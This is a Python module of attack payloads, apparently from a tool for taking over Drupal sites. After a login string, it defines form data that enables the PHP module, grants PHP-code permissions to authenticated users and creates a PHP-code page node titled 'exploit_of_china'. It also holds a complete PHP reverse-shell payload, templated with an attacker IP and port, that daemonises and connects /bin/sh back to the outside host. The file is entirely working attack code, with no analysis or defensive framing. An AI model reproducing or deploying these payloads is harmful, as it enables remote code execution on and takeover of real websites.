revers_exploit ={
'title':'exploit_of_china',
'body[und][0][summary]':'',
'body[und][0][value]':None,
'body[und][0][format]':'php_code',
'changed':'',
'form_build_id':'',
'form_token':None,
'form_id':'page_node_form',
'menu[link_title]':'',
'menu[description]':'',
'menu[parent]':'main-menu:0',
'menu[weight]':0,
'log':'',
'path[alias]':'',
'comment':1,
'name':None,
'date':'',
'status':1,
'additional_settings__active_tab':'edit-menu',
'op':'Save'}

act_php = {'modules[Core][color][enable]':1,
'modules[Core][comment][enable]':1,
'modules[Core][contextual][enable]':1,
'modules[Core][dashboard][enable]':1,
'modules[Core][dblog][enable]':1,
'modules[Core][field_ui][enable]':1,
'modules[Core][help][enable]':1,
'modules[Core][list][enable]':1,
'modules[Core][menu][enable]':1,
'modules[Core][number][enable]':1,
'modules[Core][overlay][enable]':1,
'modules[Core][path][enable]':1,
'modules[Core][php][enable]':1,
'modules[Core][rdf][enable]':1,
'modules[Core][search][enable]':1,
'modules[Core][shortcut][enable]':1,
'modules[Core][toolbar][enable]':1,
'form_build_id':'',
'form_token':None,
'form_id':'system_modules',
'op':'Save+configuration'}

act_perm_php = {
	'3[administer blocks]':'administer blocks',
        '3[administer comments]':'administer comments',
        '1[access comments]':'access comments',
        '2[access comments]':'access comments',
        '3[access comments]':'access comments',
        '2[post comments]':'post comments',
        '3[post comments]':'post comments',
        '2[skip comment approval]':'skip comment approval',
        '3[skip comment approval]':'skip comment approval',
        '3[edit own comments]':'edit own comments',
        '3[access contextual links]':'access contextual links',
        '3[access dashboard]':'access dashboard',
        '3[administer filters]':'administer filters',
        '1[use text format filtered_html]':'use text format filtered_html',
        '2[use text format filtered_html]':'use text format filtered_html',
        '3[use text format filtered_html]':'use text format filtered_html',
        '3[use text format full_html]':'use text format full_html',
        '2[use text format php_code]':'use text format php_code',
        '3[administer image styles]':'administer image styles',
        '3[administer menu]':'administer menu',
        '3[bypass node access]':'bypass node access',
        '3[administer content types]':'administer content types',
        '3[administer nodes]':'administer nodes',
        '3[access content overview]':'access content overview',
        '1[access content]':'access content',
        '2[access content]':'access content',
        '3[access content]':'access content',
        '3[view own unpublished content]':'view own unpublished content',
        '3[view revisions]':'view revisions',
        '3[revert revisions]':'revert revisions',
        '3[delete revisions]':'delete revisions',
        '3[create article content]':'create article content',
        '3[edit own article content]':'edit own article content',
        '3[edit any article content]':'edit any article content',
        '3[delete own article content]':'delete own article content',
        '3[delete any article content]':'delete any article content',
        '3[create page content]':'create page content',
        '3[edit own page content]':'edit own page content',
        '3[edit any page content]':'edit any page content',
        '3[delete own page content]':'delete own page content',
        '3[delete any page content]':'delete any page content',
        '3[access overlay]':'access overlay',
        '2[use PHP for settings]':'use PHP for settings',
        '3[use PHP for settings]':'use PHP for settings',
        '3[administer url aliases]':'administer url aliases',
        '3[create url aliases]':'create url aliases',
        '3[administer search]':'administer search',
        '3[search content]':'search content',
        '3[use advanced search]':'use advanced search',
        '3[administer shortcuts]':'administer shortcuts',
        '3[customize shortcut links]':'customize shortcut links',
        '3[switch shortcut sets]':'switch shortcut sets',
        '3[administer modules]':'administer modules',
        '3[administer site configuration]':'administer site configuration',
        '3[administer themes]':'administer themes',
        '3[administer software updates]':'administer software updates',
        '3[administer actions]':'administer actions',
        '3[access administration pages]':'access administration pages',
        '3[access site in maintenance mode]':'access site in maintenance mode',
        '3[view the administration theme]':'view the administration theme',
        '3[access site reports]':'access site reports',
        '3[block IP addresses]':'block IP addresses',
        '3[administer taxonomy]':'administer taxonomy',
        '3[edit terms in 1]':'edit terms in 1',
        '3[delete terms in 1]':'delete terms in 1',
        '3[access toolbar]':'access toolbar',
        '3[administer permissions]':'administer permissions',
        '3[administer users]':'administer users',
        '3[access user profiles]':'access user profiles',
        '3[change own username]':'change own username',
        '3[cancel account]':'cancel account',
        '3[select account cancellation method]':'select account cancellation method',
        'form_build_id':'',
        'form_token': None,
        'form_id':'user_admin_permissions',
        'op':'Save permissions'
}


php_payload = """
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '{}'; 
$port = {};      
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {{
        // Fork and have the parent process exit
        $pid = pcntl_fork();
        if ($pid == -1) {{
                printit("ERROR: Can't fork");
                exit(1);
        }}
        if ($pid) {{
                exit(0);  // Parent exits
        }}
        if (posix_setsid() == -1) {{
                printit("Error: Can't setsid()");
                exit(1);
        }}
        $daemon = 1;
}} else {{
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
        printit("$errstr ($errno)");
        exit(1);
}}
$descriptorspec = array(
   0 => array("pipe", "r"), 
   1 => array("pipe", "w"),  
   2 => array("pipe", "w")   
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {{
        printit("ERROR: Can't spawn shell");
        exit(1);
}}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {{
        // Check for end of TCP connection
        if (feof($sock)) {{
                printit("ERROR: Shell connection terminated");
                break;
        }}
        if (feof($pipes[1])) {{
                printit("ERROR: Shell process terminated");
                break;
        }}
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
        if (in_array($sock, $read_a)) {{
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }}
        if (in_array($pipes[1], $read_a)) {{
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }}
        if (in_array($pipes[2], $read_a)) {{
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }}
}}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {{
        if (!$daemon) {{
                print "$string
";
        }}
}}
?> 
"""



sucess = '\33[92m{}\33[0m'
error = '\33[101m{}\33[0m'
natal = '\33[4m{}\33[0m'
warning = '\33[33m{}\33[0m'
login = 'name={}&pass={}&form_build_id=&form_id=user_login_block&op=Log+in'
